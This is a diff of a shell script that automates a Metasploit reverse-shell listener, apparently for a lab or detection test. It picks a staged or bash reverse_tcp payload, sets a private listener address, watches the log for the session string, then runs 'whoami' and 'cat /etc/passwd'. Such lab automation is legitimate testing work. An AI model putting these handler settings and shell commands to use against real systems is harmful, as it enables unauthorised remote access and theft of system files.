@@ -75,8 +75,10 @@ type_attacker 'use exploit/multi/handler' C-m
 if [[ "$PAYLOAD" == *staged* ]]
 then
 type_attacker 'set PAYLOAD linux/x64/shell/reverse_tcp' C-m
+INDICATOR_STRING="Sending stage" 
 else
 type_attacker 'set PAYLOAD cmd/unix/reverse_bash' C-m
+INDICATOR_STRING="Command shell session" 
 fi
 type_attacker 'set LHOST 10.2.0.201' C-m
 type_attacker 'run' C-m
@@ -85,7 +87,7 @@ type_attacker 'run' C-m
 # with reverse shell, send test commands and exit
 # (
 while true; do
-	if grep -q "Command shell session" $LOG_PATH; then
+	if grep -q "$INDICATOR_STRING" $LOG_PATH; then
 		sleep 1
 		type_attacker 'whoami' C-m
 		type_attacker 'cat /etc/passwd' C-m
